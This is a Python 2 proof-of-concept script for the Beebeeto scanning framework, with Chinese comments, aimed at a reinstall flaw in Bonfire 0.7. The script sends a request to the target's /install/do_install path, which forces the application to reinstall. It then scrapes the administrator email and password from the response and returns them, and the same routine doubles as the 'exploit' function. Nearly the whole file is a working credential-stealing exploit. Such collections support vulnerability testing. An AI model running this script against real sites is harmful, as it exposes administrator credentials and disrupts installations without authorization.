#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0005',  # 由Beebeeto官方编辑
            'name': 'Bonfire 0.7 /install.php 信息泄露漏洞 POC',  # 名称
            'author': '1024',  # 作者
            'create_date': '2014-08-01',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer3_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Bonfire',  # 漏洞所涉及的应用名称
            'vul_version': ['0.7'],  # 受漏洞影响的应用版本
            'type': 'Information Disclosure',  # 漏洞类型
            'tag': ['Bonfire', '信息泄露漏洞'],  # 漏洞相关tag
            'desc': '由于install.php安装文件对已安装的程序进行检测后没有做好后续处理，导致执行/install/do_install的时候引发重安装而暴露管理员信息。',  # 漏洞描述
            'references': ['http://www.mehmetince.net/ci-bonefire-reinstall-admin-account-vulnerability-analysis-exploit/',  # 参考链接
            ],
        },
    }

    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + '/index.php/install/do_install'
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(urllib2.Request(verify_url)).read()
        if content:
            regular = re.findall('Your Email:\s+<b>(.*?)</b><br/>\s+Password:\s+<b>(.*?)</b>', content)
            if regular:
                (username, password) = regular[0]
                args['success'] = True
                args['poc_ret']['vul_url'] = verify_url
                args['poc_ret']['Username'] = username
                args['poc_ret']['Password'] = password
                return args
        args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())
